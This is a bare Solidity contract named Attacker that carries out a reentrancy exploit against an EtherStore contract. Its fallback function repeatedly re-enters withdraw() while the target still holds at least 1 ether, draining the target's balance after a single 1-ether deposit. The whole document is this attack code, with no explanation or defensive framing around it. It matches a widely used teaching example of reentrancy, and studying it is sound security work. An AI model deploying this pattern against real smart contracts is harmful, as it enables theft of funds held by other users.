contract Attacker {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback function that is automatically called when this contract receives Ether
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(); // Call again! (Re-enter)
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }
}